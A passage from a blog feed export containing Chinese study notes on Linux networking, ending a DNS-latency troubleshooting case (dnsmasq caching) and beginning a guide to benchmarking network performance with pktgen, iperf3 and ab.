class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=30 <span class="hljs-attribute">time</span>=431.458 ms<br>--- 8.8.8.8<span class="hljs-built_in"> ping </span>statistics ---<br>3 packets transmitted, 2 packets received, 33% packet loss<br>round-trip min/avg/max/stddev = 134.032/282.745/431.458/148.713 ms<br><br></code></pre></td></tr></table></figure><p>这也进一步解释了，为什么 nslookup 偶尔会失败，正是网络链路中的丢包导致的。</p><p>碰到这种问题该怎么办呢？显然，既然延迟太大，那就换一个延迟更小的 DNS 服务器，比如电信提供的 114.114.114.114。</p><p>配置之前，我们可以先用 ping 测试看看，它的延迟是不是真的比 8.8.8.8 好。执行下面的命令，你就可以看到，它的延迟只有 31ms：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/#<span class="hljs-built_in"> ping </span>-c3 114.114.114.114<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>114.114.114.114 (114.114.114.114): 56 data bytes<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=0 <span class="hljs-attribute">ttl</span>=67 <span class="hljs-attribute">time</span>=31.130 ms<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=56 <span class="hljs-attribute">time</span>=31.302 ms<br>64 bytes <span class="hljs-keyword">from</span> 114.114.114.114: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=56 <span class="hljs-attribute">time</span>=31.250 ms<br>--- 114.114.114.114<span class="hljs-built_in"> ping </span>statistics ---<br>3 packets transmitted, 3 packets received, 0% packet loss<br>round-trip min/avg/max/stddev = 31.130/31.227/31.302/0.072 ms<br><br></code></pre></td></tr></table></figure><p>这个结果表明，延迟的确小了很多。继续执行下面的命令，更换 DNS 服务器，然后，再次执行 nslookup 解析命令：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">/<span class="hljs-meta"># echo nameserver 114.114.114.114 &gt; /etc/resolv.conf</span><br>/<span class="hljs-meta"># time nslookup time.geekbang.org</span><br><span class="hljs-symbol">Server:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br><span class="hljs-symbol">Address:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><span class="hljs-meta">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>time.geekbang<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Address:</span> <span class="hljs-number">39.106</span><span class="hljs-number">.233</span><span class="hljs-number">.176</span><br><br>real    <span class="hljs-number">0</span>m0<span class="hljs-number">.064</span>s<br>user    <span class="hljs-number">0</span>m0<span class="hljs-number">.007</span>s<br>sys     <span class="hljs-number">0</span>m0<span class="hljs-number">.006</span>s<br><br></code></pre></td></tr></table></figure><p>可以发现，现在只需要 64ms 就可以完成解析，比刚才的 10s 要好很多。</p><p>到这里，问题看似就解决了。不过，如果你多次运行 nslookup 命令，估计就不是每次都有好结果了。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">/<span class="hljs-meta"># time nslookup time.geekbang.org</span><br><span class="hljs-symbol">Server:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><br><span class="hljs-symbol">Address:</span><span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span><span class="hljs-meta">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>time.geekbang<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Address:</span> <span class="hljs-number">39.106</span><span class="hljs-number">.233</span><span class="hljs-number">.176</span><br><br>real<span class="hljs-number">0</span>m1<span class="hljs-number">.045</span>s<br>user<span class="hljs-number">0</span>m0<span class="hljs-number">.007</span>s<br>sys<span class="hljs-number">0</span>m0<span class="hljs-number">.004</span>s<br><br></code></pre></td></tr></table></figure><p>1s 的 DNS 解析时间还是太长了，对很多应用来说也是不可接受的。那么，该怎么解决这个问题呢？</p><p>那就是使用 <strong>DNS 缓存</strong>。这样，只有第一次查询时需要去 DNS 服务器请求，以后的查询，只要 DNS 记录不过期，使用缓存中的记录就可以了。</p><p>不过要注意，我们使用的主流 Linux 发行版，除了最新版本的 Ubuntu （如 18.04 或者更新版本）外，其他版本并没有自动配置 DNS 缓存。</p><p>所以，想要为系统开启 DNS 缓存，就需要你做额外的配置。比如，最简单的方法，就是使用 dnsmasq。</p><p><strong>dnsmasq</strong> 是最常用的 DNS 缓存服务之一，还经常作为 DHCP 服务来使用。它的安装和配置都比较简单，性能也可以满足绝大多数应用程序对 DNS 缓存的需求。</p><p>我们继续在刚才的容器终端中，执行下面的命令，就可以启动 dnsmasq：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">/<span class="hljs-comment"># /etc/init.d/dnsmasq start</span><br> * Starting DNS forwarder <span class="hljs-keyword">and</span> DHCP server dnsmas<span class="hljs-string">q                    [ OK ]</span><br><br></code></pre></td></tr></table></figure><p>然后，修改 &#x2F;etc&#x2F;resolv.conf，将 DNS 服务器改为 dnsmasq 的监听地址，这儿是 127.0.0.1。接着，重新执行多次 nslookup 命令：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">/<span class="hljs-meta"># echo nameserver 127.0.0.1 &gt; /etc/resolv.conf</span><br>/<span class="hljs-meta"># time nslookup time.geekbang.org</span><br><span class="hljs-symbol">Server:</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><span class="hljs-symbol">Address:</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>time.geekbang<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Address:</span> <span class="hljs-number">39.106</span><span class="hljs-number">.233</span><span class="hljs-number">.176</span><br><br>real<span class="hljs-number">0</span>m0<span class="hljs-number">.492</span>s<br>user<span class="hljs-number">0</span>m0<span class="hljs-number">.007</span>s<br>sys<span class="hljs-number">0</span>m0<span class="hljs-number">.006</span>s<br><br>/<span class="hljs-meta"># time nslookup time.geekbang.org</span><br><span class="hljs-symbol">Server:</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><span class="hljs-symbol">Address:</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>time.geekbang<span class="hljs-meta">.org</span><br><span class="hljs-symbol">Address:</span> <span class="hljs-number">39.106</span><span class="hljs-number">.233</span><span class="hljs-number">.176</span><br><br>real<span class="hljs-number">0</span>m0<span class="hljs-number">.011</span>s<br>user<span class="hljs-number">0</span>m0<span class="hljs-number">.008</span>s<br>sys<span class="hljs-number">0</span>m0<span class="hljs-number">.003</span>s<br><br></code></pre></td></tr></table></figure><p>现在我们可以看到，只有第一次的解析很慢，需要 0.5s，以后的每次解析都很快，只需要 11ms。并且，后面每次 DNS 解析需要的时间也都很稳定。</p><p>案例的最后，还是别忘了执行 exit，退出容器终端，Docker 会自动清理案例容器。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DNS 是互联网中最基础的一项服务，提供了域名和 IP 地址间映射关系的查询服务。很多应用程序在最初开发时，并没考虑 DNS 解析的问题，后续出现问题后，排查好几天才能发现，其实是 DNS 解析慢导致的。</p><p>试想，假如一个 Web 服务的接口，每次都需要 1s 时间来等待 DNS 解析，那么，无论你怎么优化应用程序的内在逻辑，对用户来说，这个接口的响应都太慢，因为响应时间总是会大于 1 秒的。</p><p>所以，在应用程序的开发过程中，我们必须考虑到 DNS 解析可能带来的性能问题，掌握常见的优化方法。这里，总结了几种常见的 DNS 优化方法。</p><ul><li><p>对 DNS 解析的结果进行<strong>缓存</strong>。缓存是最有效的方法，但要注意，一旦缓存过期，还是要去 DNS 服务器重新获取新记录。不过，这对大部分应用程序来说都是可接受的。</p></li><li><p>对 DNS 解析的结果进行预取。这是浏览器等 Web 应用中最常用的方法，也就是说，不等用户点击页面上的超链接，浏览器就会在后台自动解析域名，并把结果缓存起来。</p></li><li><p>使用 HTTPDNS 取代常规的 DNS 解析。这是很多移动应用会选择的方法，特别是如今域名劫持普遍存在，使用 HTTP 协议绕过链路中的 DNS 服务器，就可以避免域名劫持的问题。</p></li><li><p>基于 DNS 的全局负载均衡（GSLB）。这不仅为服务提供了负载均衡和高可用的功能，还可以根据用户的位置，返回距离最近的 IP 地址。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>4.怎么评估linux系统的网络性能？</title>
    <link href="/2022/11/07/4-%E6%80%8E%E4%B9%88%E8%AF%84%E4%BC%B0linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%EF%BC%9F/"/>
    <url>/2022/11/07/4-%E6%80%8E%E4%B9%88%E8%AF%84%E4%BC%B0linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="4-怎么评估linux系统的网络性能？"><a href="#4-怎么评估linux系统的网络性能？" class="headerlink" title="4.怎么评估linux系统的网络性能？"></a>4.怎么评估linux系统的网络性能？</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><h2 id="性能指标回顾"><a href="#性能指标回顾" class="headerlink" title="性能指标回顾"></a>性能指标回顾</h2><p>在评估网络性能前，先来回顾一下衡量网络性能的指标有哪些。</p><p>首先， <strong>带宽</strong>，表示链路的最大传输速率，单位是 b&#x2F;s（比特&#x2F;秒）。在你为服务器选购网卡时，带宽就是最核心的参考指标。常用的带宽有 1000M、10G、40G、100G 等。</p><p>第二， <strong>吞吐量</strong>，表示没有丢包时的最大数据传输速率，单位通常为 b&#x2F;s （比特&#x2F;秒）或者 B&#x2F;s（字节&#x2F;秒）。吞吐量受带宽的限制，吞吐量&#x2F;带宽也就是该网络链路的使用率。</p><p>第三， <strong>延时</strong>，表示从网络请求发出后，一直到收到远端响应，所需要的时间延迟。这个指标在不同场景中可能会有不同的含义。它可以表示建立连接需要的时间（比如 TCP 握手延时），或者一个数据包往返所需时间（比如 RTT）。</p><p>最后， <strong>PPS</strong>，是 Packet Per Second（包&#x2F;秒）的缩写，表示以网络包为单位的传输速率。PPS 通常用来评估网络的转发能力，而基于 Linux 服务器的转发，很容易受到网络包大小的影响（交换机通常不会受到太大影响，即交换机可以线性转发）。</p><p>这四个指标中，<strong>带宽跟物理网卡配置是直接关联的</strong>。一般来说，网卡确定后，带宽也就确定了（当然，实际带宽会受限于整个网络链路中最小的那个模块）。</p><p>另外，你可能在很多地方听说过“网络带宽测试”，这里测试的实际上不是带宽，而是网络吞吐量。Linux 服务器的网络吞吐量一般会比带宽小，而对交换机等专门的网络设备来说，吞吐量一般会接近带宽。</p><p>最后的 PPS，则是以网络包为单位的网络传输速率，通常用在需要大量转发的场景中。而对 TCP 或者 Web 服务来说，更多会用并发连接数和每秒请求数（QPS，Query per Second）等指标，它们更能反应实际应用程序的性能。</p><h2 id="网络基准测试"><a href="#网络基准测试" class="headerlink" title="网络基准测试"></a>网络基准测试</h2><p>如何通过性能测试来确定这些指标的基准值。</p><p>Linux 网络基于 TCP&#x2F;IP 协议栈，而不同协议层的行为显然不同。那么，测试之前，应该弄清楚，要评估的网络性能，究竟属于协议栈的哪一层？换句话说，你的应用程序基于协议栈的哪一层呢？</p><p>根据前面学过的 TCP&#x2F;IP 协议栈的原理，这个问题应该不难回答。比如：</p><ul><li><p>基于 HTTP 或者 HTTPS 的 Web 应用程序，显然属于应用层，需要我们测试 HTTP&#x2F;HTTPS 的性能；</p></li><li><p>而对大多数游戏服务器来说，为了支持更大的同时在线人数，通常会基于 TCP 或 UDP ，与客户端进行交互，这时就需要测试 TCP&#x2F;UDP 的性能；</p></li><li><p>还有一些场景，是把 Linux 作为一个软交换机或者路由器来用的。这种情况下，你更关注网络包的处理能力（即 PPS），重点关注网络层的转发性能。</p></li></ul><p>接下来，从下往上，了解不同协议层的网络性能测试方法。不过要注意，低层协议是其上的各层网络协议的基础。自然，低层协议的性能，也就决定了高层的网络性能。</p><blockquote><p>注意，以下所有的测试方法，都需要两台 Linux 虚拟机。其中一台，可以当作待测试的目标机器；而另一台，则可以当作正在运行网络服务的客户端，用来运行测试工具。</p></blockquote><h2 id="各协议层的性能测试"><a href="#各协议层的性能测试" class="headerlink" title="各协议层的性能测试"></a>各协议层的性能测试</h2><h3 id="转发性能"><a href="#转发性能" class="headerlink" title="转发性能"></a>转发性能</h3><p>首先来看，网络接口层和网络层，它们主要负责网络包的封装、寻址、路由以及发送和接收。在这两个网络协议层中，每秒可处理的网络包数 PPS，就是最重要的性能指标。特别是 64B 小包的处理能力，值得我们特别关注（小包更能体现pps的性能）。那么，如何来测试网络包的处理能力呢？</p><p>Linux 内核自带的高性能网络测试工具 <a href="https://wiki.linuxfoundation.org/networking/pktgen">pktgen</a>。pktgen 支持丰富的自定义选项，方便你根据实际需要构造所需网络包，从而更准确地测试出目标服务器的性能。</p><p>不过，在 Linux 系统中，并不能直接找到 pktgen 命令。因为 pktgen 作为一个内核线程来运行，需要你加载 pktgen 内核模块后，再通过 &#x2F;proc 文件系统来交互。下面就是 pktgen 启动的两个内核线程和 &#x2F;proc 文件系统的交互文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ modprobe pktgen<br>$ ps -ef | <span class="hljs-keyword">grep</span> pktgen | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span><br>root     <span class="hljs-number">26384</span>     <span class="hljs-number">2</span>  <span class="hljs-number">0</span> <span class="hljs-number">06</span>:<span class="hljs-number">17</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> [kpktgend_0]<br>root     <span class="hljs-number">26385</span>     <span class="hljs-number">2</span>  <span class="hljs-number">0</span> <span class="hljs-number">06</span>:<span class="hljs-number">17</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> [kpktgend_1]<br>$ ls <span class="hljs-regexp">/proc/</span>net<span class="hljs-regexp">/pktgen/</span><br>kpktgend_0  kpktgend_1  pgctrl<br><br></code></pre></td></tr></table></figure><p>pktgen 在每个 CPU 上启动一个内核线程，并可以通过 &#x2F;proc&#x2F;net&#x2F;pktgen 下面的同名文件，跟这些线程交互；而 pgctrl 则主要用来控制这次测试的开启和停止。</p><blockquote><p>如果 modprobe 命令执行失败，说明你的内核没有配置 CONFIG_NET_PKTGEN 选项。这就需要你配置 pktgen 内核模块（即 CONFIG_NET_PKTGEN&#x3D;m）后，重新编译内核，才可以使用。</p></blockquote><p>在使用 pktgen 测试网络性能时，需要先给每个内核线程 kpktgend_X 以及测试网卡，配置 pktgen 选项，然后再通过 pgctrl 启动测试。</p><p>以发包测试为例，假设发包机器使用的网卡是 eth0，而目标机器的 IP 地址为 192.168.0.30，MAC 地址为 11:11:11:11:11:11。</p><p><img src="https://static001.geekbang.org/resource/image/f0/09/f01dc79465e7f1d03b6fbdabbe4ad109.png?wh=1310*466" alt="img"></p><p>接下来，就是一个发包测试的示例。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 定义一个工具函数，方便后面配置各种测试选项</span><br><span class="hljs-keyword">function</span> pgset() &#123;<br>    local result<br>    echo <span class="hljs-variable">$1</span> &gt; <span class="hljs-variable">$PGDEV</span><br><br>    result=`cat <span class="hljs-variable">$PGDEV</span> | fgrep <span class="hljs-string">&quot;Result: OK:&quot;</span>`<br>    <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$result&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ]; then<br>         cat <span class="hljs-variable">$PGDEV</span> | fgrep Result:<br>    fi<br>&#125;<br><br><span class="hljs-comment"># 为0号线程绑定eth0网卡</span><br>PGDEV=<span class="hljs-regexp">/proc/</span>net<span class="hljs-regexp">/pktgen/</span>kpktgend_0<br>pgset <span class="hljs-string">&quot;rem_device_all&quot;</span>   <span class="hljs-comment"># 清空网卡绑定</span><br>pgset <span class="hljs-string">&quot;add_device eth0&quot;</span>  <span class="hljs-comment"># 添加eth0网卡</span><br><br><span class="hljs-comment"># 配置eth0网卡的测试选项</span><br>PGDEV=<span class="hljs-regexp">/proc/</span>net<span class="hljs-regexp">/pktgen/</span>eth0<br>pgset <span class="hljs-string">&quot;count 1000000&quot;</span>    <span class="hljs-comment"># 总发包数量</span><br>pgset <span class="hljs-string">&quot;delay 5000&quot;</span>       <span class="hljs-comment"># 不同包之间的发送延迟(单位纳秒)</span><br>pgset <span class="hljs-string">&quot;clone_skb 0&quot;</span>      <span class="hljs-comment"># SKB包复制</span><br>pgset <span class="hljs-string">&quot;pkt_size 64&quot;</span>      <span class="hljs-comment"># 网络包大小</span><br>pgset <span class="hljs-string">&quot;dst 192.168.0.30&quot;</span> <span class="hljs-comment"># 目的IP</span><br>pgset <span class="hljs-string">&quot;dst_mac 11:11:11:11:11:11&quot;</span>  <span class="hljs-comment"># 目的MAC</span><br><br><span class="hljs-comment"># 启动测试</span><br>PGDEV=<span class="hljs-regexp">/proc/</span>net<span class="hljs-regexp">/pktgen/</span>pgctrl<br>pgset <span class="hljs-string">&quot;start&quot;</span><br><br></code></pre></td></tr></table></figure><p>稍等一会儿，测试完成后，结果可以从 &#x2F;proc 文件系统中获取。通过下面代码段中的内容，我们可以查看刚才的测试报告：</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tcl">$ cat /<span class="hljs-keyword">proc</span>/net/pktgen/eth0<span class="hljs-title"></span><br><span class="hljs-title">Params:</span> count 1000000<span class="hljs-title">  min_pkt_size:</span> 64<span class="hljs-title">  max_pkt_size:</span> 64<span class="hljs-title"></span><br><span class="hljs-title">     frags:</span> 0<span class="hljs-title">  delay:</span> 0<span class="hljs-title">  clone_skb:</span> 0<span class="hljs-title">  ifname:</span> eth0<span class="hljs-title"></span><br><span class="hljs-title">     flows:</span> 0<span class="hljs-title"> flowlen:</span> 0<br>...<span class="hljs-title"></span><br><span class="hljs-title">Current:</span><br><span class="hljs-title">     pkts-sofar:</span> 1000000<span class="hljs-title">  errors:</span> 0<span class="hljs-title"></span><br><span class="hljs-title">     started:</span> 1534853256071us<span class="hljs-title">  stopped:</span> 1534861576098us<span class="hljs-title"> idle:</span> 70673us<br>...<span class="hljs-title"></span><br><span class="hljs-title">Result:</span> OK: 8320027(c8249354+d70673)<span class="hljs-title"> usec,</span> 1000000 (64byte,0frags)<br>  120191pps 61Mb/sec (61537792bps)<span class="hljs-title"> errors:</span> 0<br><br></code></pre></td></tr></table></figure><p>测试报告主要分为三个部分：</p><ul><li><p>第一部分的 Params 是测试选项；</p></li><li><p>第二部分的 Current 是测试进度，其中， packts so far（pkts-sofar）表示已经发送了 100 万个包，也就表明测试已完成。</p></li><li><p>第三部分的 Result 是测试结果，包含测试所用时间、网络包数量和分片、PPS、吞吐量以及错误数。</p></li></ul><p>根据上面的结果，PPS 为 12 万，吞吐量为 61 Mb&#x2F;s，没有发生错误。那么，12 万的 PPS 好不好呢？</p><p>作为对比，你可以计算一下千兆交换机的 PPS。交换机可以达到线速（满负载时，无差错转发），它的 PPS 就是 1000Mbit 除以以太网帧的大小，即 1000Mbps&#x2F;((64+20)*8bit) &#x3D; 1.5 Mpps（其中，20B 为以太网帧前导和帧间距的大小）。</p><p>即使是千兆交换机的 PPS，也可以达到 150 万 PPS，比测试得到的 12 万大多了。所以，看到这个数值你并不用担心，现在的多核服务器和万兆网卡已经很普遍了，稍做优化就可以达到数百万的 PPS。而且，如果用了 DPDK 或 XDP ，还能达到千万数量级。</p><h3 id="TCP-x2F-UDP-性能"><a href="#TCP-x2F-UDP-性能" class="headerlink" title="TCP&#x2F;UDP 性能"></a>TCP&#x2F;UDP 性能</h3><p>iperf 和 netperf 都是最常用的网络性能测试工具，测试 TCP 和 UDP 的吞吐量。它们都以客户端和服务器通信的方式，测试一段时间内的平均吞吐量。</p><p>接下来，以 iperf 为例，看一下 TCP 性能的测试方法。目前，iperf 的最新版本为 iperf3，可以运行下面的命令来安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># Ubuntu</span><br>apt-get <span class="hljs-keyword">install</span> iperf3<br><span class="hljs-comment"># CentOS</span><br>yum <span class="hljs-keyword">install</span> iperf3<br><br></code></pre></td></tr></table></figure><p>然后，在目标机器上启动 iperf 服务端：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-comment"># -s表示启动服务端，-i表示汇报间隔，-p表示监听端口</span><br><span class="hljs-variable">$ </span>iperf3 -s -i <span class="hljs-number">1</span> -p <span class="hljs-number">10000</span><br><br></code></pre></td></tr></table></figure><p>接着，在另一台机器上运行 iperf 客户端，运行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">-c表示启动客户端，192.168.0.30为目标服务器的IP</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-b表示目标带宽(单位是bits/s)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-t表示测试时间</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-P表示并发数，-p表示目标服务器监听端口</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iperf3 -c 192.168.0.30 -b 1G -t 15 -P 2 -p 10000</span><br><br></code></pre></td></tr></table></figure><p>稍等一会儿（15秒）测试结束后，回到目标服务器，查看 iperf 的报告：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel">[ ID] Interval           Transfer     Bandwidth<br>...<br>[<span class="hljs-built_in">SUM</span>]   <span class="hljs-number">0.00</span>-<span class="hljs-number">15.04</span>  <span class="hljs-built_in">sec</span>  <span class="hljs-number">0.00</span> Bytes  <span class="hljs-number">0.00</span> bits/<span class="hljs-built_in">sec</span>                  sender<br>[<span class="hljs-built_in">SUM</span>]   <span class="hljs-number">0.00</span>-<span class="hljs-number">15.04</span>  <span class="hljs-built_in">sec</span>  <span class="hljs-number">1.51</span> GBytes   <span class="hljs-number">860</span> Mbits/<span class="hljs-built_in">sec</span>                  receiver<br><br></code></pre></td></tr></table></figure><p>最后的 SUM 行就是测试的汇总结果，包括测试时间、数据传输量以及带宽等。按照发送和接收，这一部分又分为了 sender 和 receiver 两行。</p><p>从测试结果你可以看到，这台机器 TCP 接收的带宽（吞吐量）为 860 Mb&#x2F;s， 跟目标的 1Gb&#x2F;s 相比，还是有些差距的。</p><h3 id="HTTP-性能"><a href="#HTTP-性能" class="headerlink" title="HTTP 性能"></a>HTTP 性能</h3><p>从传输层再往上，到了应用层。有的应用程序，会直接基于 TCP 或 UDP 构建服务。当然，也有大量的应用，基于应用层的协议来构建服务，HTTP 就是最常用的一个应用层协议。比如，常用的 Apache、Nginx 等各种 Web 服务，都是基于 HTTP。</p><p>要测试 HTTP 的性能，也有大量的工具可以使用，比如 ab、webbench 等，都是常用的 HTTP 压力测试工具。其中，ab 是 Apache 自带的 HTTP 压测工具，主要测试 HTTP 服务的每秒请求数、请求延迟、吞吐量以及请求延迟的分布情况等。</p><p>运行下面的命令，你就可以安装 ab 工具：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># Ubuntu</span><br>$ apt-get <span class="hljs-keyword">install</span> -y apache2-utils<br><span class="hljs-comment"># CentOS</span><br>$ yum <span class="hljs-keyword">install</span> -y httpd-tools<br><br></code></pre></td></tr></table></figure><p>接下来，在目标机器上，使用 Docker 启动一个 Nginx 服务，然后用 ab 来测试它的性能。首先，在目标机器上运行下面的命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-built_in">run</span> -p 80:80 -itd nginx<br><br></code></pre></td></tr></table></figure><p>而在另一台机器上，运行 ab 命令，测试 Nginx 的性能：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># -c表示并发请求数为1000，-n表示总的请求数为10000</span><br><span class="hljs-string">$</span> <span class="hljs-string">ab</span> <span class="hljs-string">-c</span> <span class="hljs-number">1000</span> <span class="hljs-string">-n</span> <span class="hljs-number">10000</span> <span class="hljs-string">http://192.168.0.30/</span><br><span class="hljs-string">...</span><br><span class="hljs-attr">Server Software:</span>        <span class="hljs-string">nginx/1.15.8</span><br><span class="hljs-attr">Server Hostname:</span>        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.30</span><br><span class="hljs-attr">Server Port:</span>            <span class="hljs-number">80</span><br><br><span class="hljs-string">...</span><br><br><span class="hljs-attr">Requests per second:</span>    <span 